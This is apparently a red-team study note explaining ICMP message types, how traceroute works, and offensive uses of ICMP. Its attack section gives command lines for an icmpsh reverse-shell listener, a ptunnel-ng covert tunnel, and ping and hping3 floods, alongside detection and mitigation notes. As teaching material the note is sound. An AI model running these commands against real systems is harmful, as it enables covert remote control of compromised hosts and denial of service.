# ICMP (Internet Control Message Protocol)

## Table of Contents

- [1. Overview](#1-overview)
- [2. ICMP Message Types](#2-icmp-message-types)
- [3. Traceroute](#3-traceroute)
  - [3.1 How It Works](#31-how-it-works)
  - [3.2 Linux (UDP) vs Windows (ICMP)](#32-linux-udp-vs-windows-icmp)
- [4. Offensive Uses](#4-offensive-uses)
  - [4.1 ICMP Tunneling](#41-icmp-tunneling)
  - [4.2 ICMP Redirect Attack](#42-icmp-redirect-attack)
  - [4.3 ICMP Flood (Ping Flood / Smurf)](#43-icmp-flood-ping-flood--smurf)

---

## 1. Overview

ICMP is a **Layer 3 (Network) protocol** used for **error reporting and diagnostics** between network devices. It does not carry application data. It is used by routers and hosts to communicate problems back to the sender (e.g. "host unreachable", "packet too big", "TTL expired").

The most common use is **ping** (Echo Request / Echo Reply) to check if a host is alive and reachable. But ICMP does much more than just ping — it is the backbone of network error handling.

**Key characteristics:**
- Encapsulated directly inside IP packets (protocol number 1)
- No ports — ICMP does not use source/destination ports like TCP or UDP
- Stateless — each message is independent
- Often rate-limited or blocked by firewalls

---

## 2. ICMP Message Types

| Type | Code | Name | Description |
|------|------|------|-------------|
| 0 | 0 | Echo Reply | Response to a ping (Type 8). "Yes, I'm alive." |
| 3 | 0 | Destination Unreachable — Network | The router cannot reach the destination network. No route exists. |
| 3 | 1 | Destination Unreachable — Host | The network is reachable but the specific host is not responding. |
| 3 | 3 | Destination Unreachable — Port | The host is reachable but nothing is listening on that UDP port. This is how **UDP scanning** detects closed ports. |
| 3 | 4 | Fragmentation Needed (DF set) | The packet is too big for the next hop's MTU and the Don't Fragment flag is set. Used by **Path MTU Discovery**. |
| 3 | 13 | Destination Unreachable — Administratively Prohibited | A **firewall** is explicitly blocking the traffic and telling you about it (rare — most firewalls silently drop). |
| 5 | 0 | Redirect | A router tells the sender "there's a better route, send your next packets to this other gateway instead." |
| 8 | 0 | Echo Request | Ping. "Are you alive?" |
| 11 | 0 | Time Exceeded — TTL expired | A router decremented the TTL to 0 and dropped the packet. This is the message that makes **traceroute** work. |

---

## 3. Traceroute

### 3.1 How It Works

Traceroute exploits the TTL field and ICMP Time Exceeded messages to discover every router between you and the destination.

```
Step 1: Send packet with TTL=1
  → First router decrements TTL to 0 → drops packet
  → Sends back ICMP Time Exceeded (Type 11)
  → You now know the IP of router #1

Step 2: Send packet with TTL=2
  → Router #1 decrements to 1, forwards
  → Router #2 decrements to 0 → drops packet
  → Sends back ICMP Time Exceeded
  → You now know the IP of router #2

Step 3: Send packet with TTL=3
  ...

Step N: Send packet with TTL=N
  → Packet reaches the destination
  → Destination responds (method depends on implementation)
  → Traceroute complete
```

### 3.2 Linux (UDP) vs Windows (ICMP)

The difference is in **what packet is sent** with the incrementing TTL. The ICMP Time Exceeded mechanism is the same — the difference is how the **final destination** responds.

**Linux (`traceroute`)** — sends **UDP packets** to high ports (33434+):
```
TTL=1,2,3... → routers reply with ICMP Time Exceeded (same for both)

When the packet reaches the destination:
  → Nothing listens on port 33434
  → Destination replies with ICMP Port Unreachable (Type 3, Code 3)
  → traceroute knows it has reached the end
```

**Windows (`tracert`)** — sends **ICMP Echo Request** (ping):
```
TTL=1,2,3... → routers reply with ICMP Time Exceeded (same for both)

When the packet reaches the destination:
  → Destination replies with ICMP Echo Reply (Type 0)
  → tracert knows it has reached the end
```

**Why it matters for Red Team:** Some firewalls block ICMP but allow UDP (or vice versa). If `tracert` fails, `traceroute` might still work (and you can also force ICMP mode on Linux with `traceroute -I` or use TCP with `traceroute -T`).

```bash
# Linux - default UDP
traceroute <target>

# Linux - ICMP mode (like Windows)
traceroute -I <target>

# Linux - TCP mode (useful when ICMP and UDP are blocked)
traceroute -T -p 443 <target>

# Windows - always ICMP
tracert <target>
```

---

## 4. Offensive Uses

### 4.1 ICMP Tunneling

ICMP packets have a **data section** that can carry arbitrary content. Normally this is just padding, but an attacker can stuff real data in there (commands, file contents, C2 traffic). Since many firewalls allow ping through, ICMP becomes a **covert channel**.

```
Compromised host                          Attacker's server
     |                                          |
     |  -- ICMP Echo Request (data="ls -la") -> |  Attacker sends command
     |                                          |  hidden in ping data
     |  <- ICMP Echo Reply (data=output) ------ |  Server executes and
     |                                          |  returns output in reply
```

**Tools:**
- `icmpsh` — simple ICMP reverse shell (no need for root on Windows)
- `ptunnel` / `ptunnel-ng` — TCP-over-ICMP tunnel
- `hans` — IP-over-ICMP tunnel (creates a tun interface)

```bash
# icmpsh - attacker side (listener)
python icmpsh_m.py <attacker_ip> <victim_ip>

# ptunnel-ng - create a tunnel through ICMP
# Server side (on the pivot machine):
ptunnel-ng -s

# Client side (on attacker machine):
ptunnel-ng -p <pivot_ip> -l 8888 -r <target_ip> -R 22
# Now ssh to localhost:8888 tunnels through ICMP to target:22
```

**Detection:** Look for ICMP packets with unusually large data sections or high frequency ping traffic between two hosts.

### 4.2 ICMP Redirect Attack

ICMP Type 5 (Redirect) was designed so a router can tell a host: "There's a better gateway for that destination, use this one instead." The host is supposed to update its routing table accordingly.

**The attack:** An attacker on the same LAN sends a forged ICMP Redirect to the victim, saying "to reach the internet, send your traffic to me instead of the real gateway." If the victim accepts it, all traffic flows through the attacker → **MITM**.

```
Normal:    Victim ---> Real Gateway (192.168.1.1) ---> Internet

Attack:
  Attacker sends ICMP Redirect to Victim:
    "For destination 0.0.0.0/0, use gateway 192.168.1.50 (attacker)"

After:     Victim ---> Attacker (192.168.1.50) ---> Real Gateway ---> Internet
                            |
                       Sniffs / modifies traffic
```

**Modern mitigations:** Most modern OS **ignore ICMP Redirects** by default:
- Linux: `net.ipv4.conf.all.accept_redirects = 0` (default on most distros)
- Windows: ignores ICMP redirects since Windows Vista
- This makes the attack largely obsolete on modern networks, but old embedded devices or misconfigured hosts can still be vulnerable.

### 4.3 ICMP Flood (Ping Flood / Smurf)

**Ping Flood:** Simple DoS — send as many ICMP Echo Requests as possible to overwhelm the target's bandwidth and CPU.

```bash
# Basic ping flood (requires root)
ping -f <target>

# With hping3 (custom size, high speed)
hping3 --icmp --flood -d 65000 <target>
```

**Smurf Attack (amplified):** The attacker sends ICMP Echo Requests to a **broadcast address** (e.g. `192.168.1.255`) with the **source IP spoofed as the victim's**. Every host on that subnet responds with an Echo Reply to the victim. If the subnet has 200 hosts, the attacker's traffic is amplified x200.

```
Attacker (spoofed src = victim)
   |
   |-- ICMP Echo Request --> 192.168.1.255 (broadcast)
   |
   All 200 hosts on the subnet respond:
   Host 1 -- ICMP Echo Reply --> Victim
   Host 2 -- ICMP Echo Reply --> Victim
   Host 3 -- ICMP Echo Reply --> Victim
   ...
   Host 200 -- ICMP Echo Reply --> Victim
```

**Modern mitigations:**
- Routers no longer forward directed broadcasts by default (`no ip directed-broadcast` on Cisco)
- Most OS don't respond to broadcast pings
- Smurf is largely dead, but the concept lives on in UDP amplification attacks
